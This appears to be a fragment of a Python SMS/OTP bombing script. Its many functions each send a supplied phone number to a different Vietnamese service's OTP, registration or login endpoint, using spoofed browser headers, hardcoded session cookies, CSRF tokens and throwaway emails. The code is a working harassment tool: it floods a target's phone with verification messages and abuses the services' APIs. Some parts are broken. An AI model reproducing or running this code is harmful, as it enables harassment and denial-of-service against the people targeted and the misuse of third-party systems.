    Headers = {"Host": "api.moneydong.vip","content-length": "72","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://h5.moneydong.vip","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://h5.moneydong.vip/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Payload = {"phone": phone[1:11], "type": "2", "ctype": "1", "chntoken": "69ad075c94c279e43608c5d50b77e8b9"}
    response = requests.post("https://api.moneydong.vip/h5/LoginMessage_ultimate", data=Payload, headers=Headers)
def gbay(phone):
    json_data = {'phone_number': phone,'hash': random_string(40),}
    requests.post('https://api-wallet.g-pay.vn/internal/api/v3/users/send-otp-reg-phone', json=json_data).json()
def call10(phone):
  headers = {
    'authority':
    'api.dongplus.vn',
    'accept':
    '*/*',
    'accept-language':
    'vi',
    'content-type':
    'application/json',
    'origin':
    'https://dongplus.vn',
    'referer':
    'https://dongplus.vn/user/login',
    'sec-ch-ua':
    '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile':
    '?1',
    'sec-ch-ua-platform':
    '"Android"',
    'sec-fetch-dest':
    'empty',
    'sec-fetch-mode':
    'cors',
    'sec-fetch-site':
    'same-site',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
  }

  json_data = {
    'phone': phone,
  }
  requests.post('https://api.dongplus.vn/api/user/send-one-time-password',
                headers=headers,
                json=json_data)                                                                
def vt12(sdt):
    cookies = {
        'laravel_session': '7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2',
        '__zi': '2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1',
        'redirectLogin': 'https://viettel.vn/dang-ky',
        'XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=7FpvkrZLiG7g6Ine7Pyrn2Dx7QPFFWGtDoTvToW2; __zi=2000.SSZzejyD3jSkdl-krbSCt62Sgx2OMHIUF8wXheeR1eWiWV-cZ5P8Z269zA24MWsD9eMyf8PK28WaWB-X.1; redirectLogin=https://viettel.vn/dang-ky; XSRF-TOKEN=eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/dang-ky',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'HXW7C6QsV9YPSdPdRDLYsf8WGvprHEwHxMBStnBK',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InlxYUZyMGltTnpoUDJSTWVZZjVDeVE9PSIsInZhbHVlIjoiTkRIS2pZSXkxYkpaczZQZjNjN29xRU5QYkhTZk1naHpCVEFwT3ZYTDMxTU5Panl4MUc4bGEzeTM2SVpJOTNUZyIsIm1hYyI6IjJmNzhhODdkMzJmN2ZlNDAxOThmOTZmNDFhYzc4YTBlYmRlZTExNWYwNmNjMDE5ZDZkNmMyOWIwMWY5OTg1MzIifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)    

def vt11(phone):
    cookies = {
        'laravel_session': 'XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv',
        '_gcl_au': '1.1.307401310.1685096321',
        '_gid': 'GA1.2.1786782073.1685096321',
        '_fbp': 'fb.1.1685096322884.1341401421',
        '__zi': '2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1',
        'redirectLogin': 'https://vietteltelecom.vn/dang-ky',
        '_ga_VH8261689Q': 'GS1.1.1685096321.1.1.1685096380.1.0.0',
        '_ga': 'GA1.2.1385846845.1685096321',
        '_gat_UA-58224545-1': '1',
        'XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'laravel_session=XDw3rSn7ipZocrQTQOYxheTOvGVO2BPLJJC9Iqpv; _gcl_au=1.1.307401310.1685096321; _gid=GA1.2.1786782073.1685096321; _fbp=fb.1.1685096322884.1341401421; __zi=2000.SSZzejyD3jSkdl-krWqVtYU9zQ-T61wH9TthuPC0NCqtr_NpqH9AtJY9_VMSN4xGC8Bx_P0PJzSyol__dXnArJCoDG.1; redirectLogin=https://vietteltelecom.vn/dang-ky; _ga_VH8261689Q=GS1.1.1685096321.1.1.1685096380.1.0.0; _ga=GA1.2.1385846845.1685096321; _gat_UA-58224545-1=1; XSRF-TOKEN=eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ%3D%3D',
        'Origin': 'https://vietteltelecom.vn',
        'Referer': 'https://vietteltelecom.vn/dang-nhap',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36',
        'X-CSRF-TOKEN': 'dS0MwhelCkb96HCH9kVlEd3CxX8yyiQim71Acpr6',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6Im4zUUJSaGRYRlJtaFNcL210cjdvQmJ3PT0iLCJ2YWx1ZSI6IkZKdHppMVJIU2xGU2l3RmFUeEpqM1Y5ZHFra0tnQjFCMVREMlwvUXpneENEd1VyMjI0aHQ4eWlVXC83a2VycmlCdCIsIm1hYyI6IjNmYTg4YThhOGNkZmQzZTQ4MGQ1MDBjMWVmMWNmYTAxNzYxNWMxM2NjZDY1MmZmYjFlYzViOTUyOTUxMmRiNWYifQ==',
        'sec-ch-ua': '"Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
        'type': '',
    }

    response = requests.post('https://vietteltelecom.vn/api/get-otp-login', cookies=cookies, headers=headers, json=json_data)
def takomo(phone):
    cookies = {
        '_gid': 'GA1.3.628124806.1692525961',
    '_gat': '1',
    '_ga': 'GA1.1.130800652.1692525961',
    'vMobile': '2',
    '_gcl_au': '1.1.852179314.1692525962',
    'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '1b49eaeb-a1c4-47f1-b9f1-99d5fa5e0631',
    'cf_clearance': '2HQYSuFi4lP1DI9SFfGsu5nmnefWfooWaMKZzTvlhVU-1692525976-0-1-28fe7102.1e40ad9a.7fff2ee2-0.2.1692525976',
    'fpt_uuid': '%2276437874-ba1a-4be9-9aec-4cd794db636a%22',
    'ajs_group_id': 'null',
    '_fbp': 'fb.2.1692525963414.1112024482',
    '_tt_enable_cookie': '1',
    '_ttp': 'pgxU69feWGS-z5k1Zr7P45WKahE',
    '__admUTMtime': '1692525963',
    '__iid': '',
    '__iid': '',
    '__su': '0',
    '__su': '0',
    '_hjSessionUser_731679': 'eyJpZCI6ImIzZTkxY2ZkLTQ3N2ItNTViMi1hZDgyLWU2ZjE2Y2JhOWZkZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQzOTMsImV4aXN0aW5nIjpmYWxzZX0=',
    '_hjFirstSeen': '1',
    '_hjIncludedInSessionSample_731679': '0',
    '_hjSession_731679': 'eyJpZCI6ImExNTZmZGNmLWIxODEtNGZlMC1hMDI0LWJmYWM5NDJjZjNmZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQ0MDgsImluU2FtcGxlIjpmYWxzZX0=',
    '_hjAbsoluteSessionInProgress': '0',
    '__zi': '2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpesayLndkHe-BMH1_FTP7cujTFKSjndUtWqaDHo0.1',
    '_ga_ZR815NQ85K': 'GS1.1.1692525961.1.0.1692525965.56.0.0',
    '__RC': '21',
    '__R': '1',
    '__uif': '__uid%3A4692525980251642518%7C__ui%3A-1%7C__create%3A1692525980',
    }

    headers = {
        'Accept': '*/*',
    'Accept-Language': 'vi',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gid=GA1.3.628124806.1692525961; _gat=1; _ga=GA1.1.130800652.1692525961; vMobile=2; _gcl_au=1.1.852179314.1692525962; log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=1b49eaeb-a1c4-47f1-b9f1-99d5fa5e0631; cf_clearance=2HQYSuFi4lP1DI9SFfGsu5nmnefWfooWaMKZzTvlhVU-1692525976-0-1-28fe7102.1e40ad9a.7fff2ee2-0.2.1692525976; fpt_uuid=%2276437874-ba1a-4be9-9aec-4cd794db636a%22; ajs_group_id=null; _fbp=fb.2.1692525963414.1112024482; _tt_enable_cookie=1; _ttp=pgxU69feWGS-z5k1Zr7P45WKahE; __admUTMtime=1692525963; __iid=; __iid=; __su=0; __su=0; _hjSessionUser_731679=eyJpZCI6ImIzZTkxY2ZkLTQ3N2ItNTViMi1hZDgyLWU2ZjE2Y2JhOWZkZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQzOTMsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImExNTZmZGNmLWIxODEtNGZlMC1hMDI0LWJmYWM5NDJjZjNmZiIsImNyZWF0ZWQiOjE2OTI1MjU5NjQ0MDgsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __zi=2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpesayLndkHe-BMH1_FTP7cujTFKSjndUtWqaDHo0.1; _ga_ZR815NQ85K=GS1.1.1692525961.1.0.1692525965.56.0.0; __RC=21; __R=1; __uif=__uid%3A4692525980251642518%7C__ui%3A-1%7C__create%3A1692525980',
    'Origin': 'https://fptshop.com.vn',
    'Referer': 'https://fptshop.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
    'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
def vnd(phone):
	
    headers = {
        'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'Accept-Language': 'vi-VN',
    'sec-ch-ua-mobile': '?0',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'Content-Type': 'application/json; charset=utf-8',
    'Accept': 'application/json',
    'Referer': 'https://vayvnd.vn/',
    'Site-Id': '3',
    'sec-ch-ua-platform': '"Windows"',
    }

    json_data = {
        'phone': phone,
         'utm': [
        {
            'utm_source': 'google',
            'utm_medium': 'organic',
            'referrer': 'https://www.google.com/',
        },
    ],
    'sourceSite': 3,
}

    response = requests.post('https://api.vayvnd.vn/v2/users', headers=headers, json=json_data)
def dz(phone):
	
    headers = {
        'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'vi',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'SN5c8116d5e6183=obrotdr64hnqgjpcj6ob86oelp; GN_USER_ID_KEY=cafe68b5-a7da-409d-b002-234ead2641f3; GN_SESSION_ID_KEY=6b908c50-3470-4365-ba2a-19fe2e55063d; _hjSessionUser_2975850=eyJpZCI6IjE4YjU3NDUzLTVkODYtNTcyMC1hZjI5LWZmYWI2YTA2MGQ0ZCIsImNyZWF0ZWQiOjE2OTI1MjQ0OTY0MDIsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjSession_2975850=eyJpZCI6ImM2ZTZjYTY0LTQ2ZTAtNDliYi05NjM1LWZiYTI2ZTAyMjMzNCIsImNyZWF0ZWQiOjE2OTI1MjQ0OTY0MTYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _gid=GA1.2.1503454215.1692524496; _fbp=fb.1.1692524496592.1575433764; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=Avmk9eq+cGrU6sHa5HbtrxpvfHPTcUoytEtvKTp8FuM=; OnCredit_id=64e1dfe401cf50.07637743; _hjSession_1876820=eyJpZCI6IjgzMDVmZmUzLTdhZjUtNGFlMy1hMjY1LTMyOTY2Mzc1N2M1OSIsImNyZWF0ZWQiOjE2OTI1MjQ1MDQzMTQsImluU2FtcGxlIjpmYWxzZX0=; _hjSessionUser_1876820=eyJpZCI6IjUxYzEyYzM2LTUzYzktNWI1MC05MTJlLTQ3OGZjMDFlOTE0ZCIsImNyZWF0ZWQiOjE2OTI1MjQ1MDQzMTAsImV4aXN0aW5nIjp0cnVlfQ==; gravitecOptInBlocked=true; _ga=GA1.1.785733423.1692524496; _ga_4RZFMB042P=GS1.2.1692524496.1.1.1692524600.18.0.0; _ga_462Z3ZX24C=GS1.1.1692524496.1.1.1692525112.60.0.0',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not_A Brand";v="99", "Google Chrome";v="109", "Chromium";v="109"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
    }

data = {
    'data[typeData]': 'sendCodeReg',
    'data[phone]': phone,
    'data[email]': 'djtconmevaycc@gmail.com',
    'data[captcha1]': '1',
    'data[lang]': 'vi',
    'CSRFName': 'CSRFGuard_ajax',
    'CSRFToken': '5i9sDBkey9TDfaRHkaS2FdZS3eb69k3NzT7A4ZhzGkaEa6K4yiTtzzshY3ae4hfH',
  }
response = requests.post('https://oncredit.vn/?ajax',  headers=headers, data=data)
def gotadi(phone):
    Headers = {"Host": "api.gotadi.com","content-length": "44","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json","sec-ch-ua-platform": "\"Android\"","gtd-client-tracking-device-id": "85519cab-85d7-4881-abfa-65d2a2bb3a52","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","content-type": "application/json","origin": "https://www.gotadi.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gotadi.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"phoneNumber": phone,"language":"VI"})
    response = requests.post("https://api.gotadi.com/b2c-web/api/register/phone-number/resend-otp", data=Datason, headers=Headers)
###
def funring(phone):
    Headers = {"Host": "funring.vn","Connection": "keep-alive","Content-Length": "28","Accept": "*/*","User-Agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","Content-Type": "application/json","Origin": "http://funring.vn","Referer": "http://funring.vn/module/register_mobile.jsp","Accept-Encoding": "gzip, deflate","Accept-Language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","Cookie": "JSESSIONID\u003dNODE011a2c48nzutiw8p6cy3nabxbx974764.NODE01; _ga\u003dGA1.2.1626827841.1679236846; _gid\u003dGA1.2.888694467.1679236846; _gat\u003d1"}
    Datason = json.dumps({"username": phone[1:11]})
    response = requests.post("http://funring.vn/api/v1.0.1/jersey/user/getotp", data=Datason, headers=Headers)

def call11(phone):
  cookies = {
    'OnCredit_id': '643d8607c6ffe8.92935100',
    'fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef':
    'o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=',
    'SN5c8116d5e6183': 'rfsd6jmf1e0daeapvmv1p0i6bu',
  }

  headers = {
    'authority': 'oncredit.vn',
    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language':
    'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'cookie': 'OnCredit_id=643d8607c6ffe8.92935100; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=o18F9FMkyjwzc8WWI7lEDpIVIrahUYQaI/C6s8jYjLI=; SN5c8116d5e6183=rfsd6jmf1e0daeapvmv1p0i6bu',
    'origin': 'https://oncredit.vn',
    'referer': 'https://oncredit.vn/registration',
    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent':
    'Mozilla/5.0 (Linux; Android 13; SM-A225F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36',
    'x-requested-with': 'XMLHttpRequest',
  }

  data = {
    'data[typeData]':
    'sendCodeReg',
    'data[phone]':
    phone,
    'data[email]':
    'tv5v4v4v4c@gmail.com',
    'data[captcha1]':
    '1',
    'data[lang]':
    'vi',
    'CSRFName':
    'CSRFGuard_ajax',
    'CSRFToken':
    't8ETz5Y5HFnBefT9dEnDBDe9S4D5RdyEFNKSFDn8b5YSFAB7yr5rD5QZ6b974ARi',
  }

  requests.post('https://oncredit.vn/?ajax',
                cookies=cookies,
                headers=headers,
                data=data)
             
def vietid(phone):
    csrfget = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F").text
    csrf = csrfget.split('name="csrf-token" value="')[1].split('"/>')[0]
    Headers = {"Host": "oauth.vietid.net","content-length": "41","cache-control": "max-age\u003d0","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","sec-ch-ua-mobile": "?1","sec-ch-ua-platform": "\"Android\"","upgrade-insecure-requests": "1","origin": "https://oauth.vietid.net","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","accept": "text/html,application/xhtml+xml,application/xml;q\u003d0.9,image/avif,image/webp,image/apng,*/*;q\u003d0.8,application/signed-exchange;v\u003db3;q\u003d0.7","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4","cookie": "_ga_H5VRTZBFLG\u003dGS1.1.1679234987.1.0.1679234987.0.0.0"}
    Payload = {"csrf-token": csrf,"account": phone}
    response = requests.post("https://oauth.vietid.net/rb/login?next\u003dhttps%3A%2F%2Foauth.vietid.net%2Frb%2Fauthorize%3Fclient_id%3D83958575a2421647%26response_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252Fenbac.com%252Fmember_login.php%26state%3De5a1e5821b9ce96ddaf6591b7a706072%26state_uri%3Dhttps%253A%252F%252Fenbac.com%252F", data=Payload, headers=Headers)
###
def ahamove(phone):
    mail = random_string(6)
    Headers = {"Host": "api.ahamove.com","content-length": "114","sec-ch-ua": "\"Chromium\";v\u003d\"110\", \"Not A(Brand\";v\u003d\"24\", \"Google Chrome\";v\u003d\"110\"","accept": "application/json, text/plain, */*","content-type": "application/json;charset\u003dUTF-8","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://app.ahamove.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://app.ahamove.com/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Datason = json.dumps({"mobile":f"{phone[1:11]}","name":"Tuấn","email":f"{mail}@gmail.com","country_code":"VN","firebase_sms_auth":"true"})
    Response = requests.post("https://api.ahamove.com/api/v3/public/user/register", data=Datason, headers=Headers)

def vieon1(phone):
    Headers = {"Host": "api.vieon.vn","content-length": "201","accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded","sec-ch-ua-mobile": "?1","authorization": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE2ODE5MTU2NjYsImp0aSI6ImY1ZGI4MDJmNTZjMjY2OTg0OWYxMjY0YTY5NjkyMzU5IiwiYXVkIjoiIiwiaWF0IjoxNjc5MzIzNjY2LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTY3OTMyMzY2NSwic3ViIjoiYW5vbnltb3VzXzdjNzc1Y2QxY2Q0OWEzMWMzODkzY2ExZTA5YWJiZGUzLTdhMTIwZTlmYWMyNWQ4NTQ1YTNjMGFlM2M0NjU3MjQzLTE2NzkzMjM2NjYiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiN2M3NzVjZDFjZDQ5YTMxYzM4OTNjYTFlMDlhYmJkZTMtN2ExMjBlOWZhYzI1ZDg1NDVhM2MwYWUzYzQ2NTcyNDMtMTY3OTMyMzY2NiIsInVhIjoiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBSTVgxOTE5KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTEwLjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwiZHQiOiJtb2JpbGVfd2ViIiwibXRoIjoiYW5vbnltb3VzX2xvZ2luIiwibWQiOiJBbmRyb2lkIDEwIiwiaXNwcmUiOjAsInZlcnNpb24iOiIifQ.aQj5VdubC7B-CLdMdE-C9OjQ1RBCW-VuD38jqwd7re4","user-agent": "Mozilla/5.0 (Linux; Linux x86_64; en-US) AppleWebKit/535.30 (KHTML, like Gecko) Chrome/51.0.2716.105 Safari/534","sec-ch-ua-platform": "\"Android\"","origin": "https://vieon.vn","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://vieon.vn/?utm_source\u003dgoogle\u0026utm_medium\u003dcpc\u0026utm_campaign\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B_T_Mainsite\u0026utm_content\u003dp_--k_vieon\u0026pid\u003dapproi\u0026c\u003dapproi_VieON_SEM_Brand_BOS_Exact\u0026af_adset\u003dapproi_VieON_SEM_Brand_BOS_Exact_VieON_ALL_1865B\u0026af_force_deeplink\u003dfalse\u0026gclid\u003dCjwKCAjwiOCgBhAgEiwAjv5whOoqP2b0cxKwybwLcnQBEhKPIfEXltJPFHHPoyZgaTWXkY-SS4pBqRoCS2IQAvD_BwE","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q\u003d0.9,fr-FR;q\u003d0.8,fr;q\u003d0.7,en-US;q\u003d0.6,en;q\u003d0.5,ru;q\u003d0.4"}
    Params = {"platform": "mobile_web","ui": "012021"}
    Payload = {"phone_number": phone,"password": "Vexx007","given_name": "","device_id": "7c775cd1cd49a31c3893ca1e09abbde3","platform": "mobile_web","model": "Android%2010","push_token": "","device_name": "Chrome%2F110","device_type": "desktop","ui": "012021"}
    response = requests.post("https://api.vieon.vn/backend/user/register/mobile", params=Params, data=Payload, headers=Headers)        
    
def tiki(phone):
  cookies = {
        '_ga': 'GA1.2.1651025600.1692762277',
  '_gid': 'GA1.2.215967924.1692762277',
  '_ga_9B0FYPSWN9': 'GS1.2.1692769369.2.0.1692769369.60.0.0',
  'serverChoice': 'Server-IPv2',
    }
  headers = {
        'authority': 'xuandungshortcuts.000webhostapp.com',
  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
  'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'cache-control': 'max-age=0',
  'content-type': 'application/x-www-form-urlencoded',
